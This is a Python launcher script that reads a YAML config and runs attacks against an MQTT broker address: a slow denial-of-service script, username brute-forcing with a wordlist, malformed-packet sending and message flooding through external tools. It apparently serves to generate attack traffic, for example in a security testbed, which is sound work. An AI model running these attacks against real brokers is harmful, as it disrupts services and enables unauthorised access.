import argparse
import subprocess
import time
import yaml

# define command-line arguments
parser = argparse.ArgumentParser(description='Execute MQTT scripts with specified parameters.')
parser.add_argument('-c', '--config', required=True, help='Path to the YAML configuration file')
args = parser.parse_args()

# Load configuration from YAML file
with open(args.config, 'r') as f:
    config = yaml.safe_load(f)

# Iterate over the operations in the configuration
for operation in config['scriptConfigurations']:
    mode = operation['mode']
    if mode == 'slowdos':
        # run the MQTT_SlowDoS.py script
        slow_dos_path = operation['slow_dos_path']
        address = operation['address']
        port = operation['port']
        keep_alive = operation['keep_alive']
        time_duration = operation['time']
        
        slow_dos_process = subprocess.Popen(['python3', slow_dos_path, '-a', address, '-p', str(port), '-k', str(keep_alive)])

        # allow the process to run for the specified amount of time
        time.sleep(time_duration)

        # kill the process
        slow_dos_process.kill()

    elif mode == 'bruteforce':
        # run the mqttsa.py script
        mqttsa_path = operation['mqttsa_path']
        address = operation['address']
        port = operation['port']
        username = operation['username']
        wordlist = operation['wordlist']
        
        other_process = subprocess.Popen(['python3', mqttsa_path, '-p', str(port), '-u', username, '-w', wordlist, address])

    elif mode == 'malformed':
        # run the mqttsa.py script with malformed data
        mqttsa_path = operation['mqttsa_path']
        address = operation['address']
        
        malformed_process = subprocess.Popen(['python3', mqttsa_path, '--md', address])

    elif mode == 'malaria':
        # run the malaria command
        malaria_command = ['/home/jishnusen/Desktop/mqtt/mqtt-malaria/malaria', 'publish', '-H', operation['address'], '-n', str(operation['message_count']), '-P', str(operation['processes']), '-s', str(operation['message_size'])]
        subprocess.run(malaria_command)
        
    print('TEN SECONDS DELAY')
    time.sleep(10)

